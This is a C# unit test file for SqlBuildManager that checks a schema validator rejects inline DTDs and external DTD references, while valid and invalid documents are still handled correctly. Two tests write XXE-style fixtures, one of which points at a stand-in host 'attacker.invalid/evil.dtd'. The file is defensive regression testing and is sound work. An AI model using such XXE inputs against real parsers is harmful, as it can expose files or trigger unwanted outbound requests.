using Microsoft.VisualStudio.TestTools.UnitTesting;
using SqlBuildManager.SqlBuild.Validator;
using System;
using System.IO;

namespace SqlBuildManager.SqlBuild.UnitTest.Validator
{
    /// <summary>
    /// SEC-003 behavioral tests: SchemaValidator must reject DTD declarations and
    /// never resolve external entity references.
    /// </summary>
    [TestClass]
    public class SchemaValidatorSecurityTests
    {
        private string _testDir = null!;

        [TestInitialize]
        public void Setup()
        {
            _testDir = Path.Combine(Path.GetTempPath(), "SchemaValidatorSecTests_" + Guid.NewGuid().ToString("N"));
            Directory.CreateDirectory(_testDir);
        }

        [TestCleanup]
        public void Teardown()
        {
            try { Directory.Delete(_testDir, recursive: true); } catch { }
        }

        // ── DTD injection ────────────────────────────────────────────────────────

        [TestMethod]
        public void ValidateAgainstSchema_XmlWithInlineDtd_ReturnsFalseNotTrue()
        {
            // Before the fix XmlTextReader without DtdProcessing.Prohibit would parse (and
            // potentially process) inline DTDs.  After the fix, DtdProcessing.Prohibit causes
            // an XmlException which the validator catches and returns false.
            string xmlPath = Path.Combine(_testDir, "dtd_attack.xml");
            File.WriteAllText(xmlPath,
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n" +
                "<!DOCTYPE foo [ <!ENTITY xxe \"injected\"> ]>\r\n" +
                "<root>hello</root>\r\n");

            string schemaPath = Path.Combine(_testDir, "empty.xsd");
            File.WriteAllText(schemaPath,
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n" +
                "<xs:schema xmlns:xs=\"http://www.w3.org/2001/XMLSchema\">\r\n" +
                "  <xs:element name=\"root\" type=\"xs:string\"/>\r\n" +
                "</xs:schema>\r\n");

            var validator = new SchemaValidator();
            bool result = validator.ValidateAgainstSchema(xmlPath, schemaPath, "");

            // DTD processing is prohibited; the document must be rejected.
            Assert.IsFalse(result, "XML with an inline DTD declaration must be rejected.");
        }

        [TestMethod]
        public void ValidateAgainstSchema_XmlWithExternalDtd_ReturnsFalse()
        {
            // An external subset declaration should also be rejected.
            string xmlPath = Path.Combine(_testDir, "extdtd.xml");
            File.WriteAllText(xmlPath,
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n" +
                "<!DOCTYPE root SYSTEM \"http://attacker.invalid/evil.dtd\">\r\n" +
                "<root/>\r\n");

            string schemaPath = Path.Combine(_testDir, "empty2.xsd");
            File.WriteAllText(schemaPath,
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n" +
                "<xs:schema xmlns:xs=\"http://www.w3.org/2001/XMLSchema\">\r\n" +
                "  <xs:element name=\"root\"/>\r\n" +
                "</xs:schema>\r\n");

            var validator = new SchemaValidator();
            bool result = validator.ValidateAgainstSchema(xmlPath, schemaPath, "");

            Assert.IsFalse(result, "XML referencing an external DTD must be rejected.");
        }

        // ── Valid document still passes ──────────────────────────────────────────

        [TestMethod]
        public void ValidateAgainstSchema_WellFormedValidXml_ReturnsTrue()
        {
            // Verify that the security fix does not break validation of a clean document.
            string xmlPath = Path.Combine(_testDir, "valid.xml");
            File.WriteAllText(xmlPath,
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n" +
                "<root><child>hello</child></root>\r\n");

            string schemaPath = Path.Combine(_testDir, "valid.xsd");
            File.WriteAllText(schemaPath,
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n" +
                "<xs:schema xmlns:xs=\"http://www.w3.org/2001/XMLSchema\">\r\n" +
                "  <xs:element name=\"root\">\r\n" +
                "    <xs:complexType>\r\n" +
                "      <xs:sequence>\r\n" +
                "        <xs:element name=\"child\" type=\"xs:string\"/>\r\n" +
                "      </xs:sequence>\r\n" +
                "    </xs:complexType>\r\n" +
                "  </xs:element>\r\n" +
                "</xs:schema>\r\n");

            var validator = new SchemaValidator();
            bool result = validator.ValidateAgainstSchema(xmlPath, schemaPath, "");

            Assert.IsTrue(result, "A valid, clean XML document must still pass schema validation.");
        }

        [TestMethod]
        public void ValidateAgainstSchema_InvalidXml_ReturnsFalse()
        {
            // Regression: schema violations must still be caught after the security fix.
            string xmlPath = Path.Combine(_testDir, "invalid.xml");
            File.WriteAllText(xmlPath,
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n" +
                "<root><unexpected-element/></root>\r\n");

            string schemaPath = Path.Combine(_testDir, "invalid.xsd");
            File.WriteAllText(schemaPath,
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n" +
                "<xs:schema xmlns:xs=\"http://www.w3.org/2001/XMLSchema\">\r\n" +
                "  <xs:element name=\"root\">\r\n" +
                "    <xs:complexType>\r\n" +
                "      <xs:sequence>\r\n" +
                "        <xs:element name=\"child\" type=\"xs:string\"/>\r\n" +
                "      </xs:sequence>\r\n" +
                "    </xs:complexType>\r\n" +
                "  </xs:element>\r\n" +
                "</xs:schema>\r\n");

            var validator = new SchemaValidator();
            bool result = validator.ValidateAgainstSchema(xmlPath, schemaPath, "");

            Assert.IsFalse(result, "An XML document that violates the schema must be rejected.");
        }
    }
}
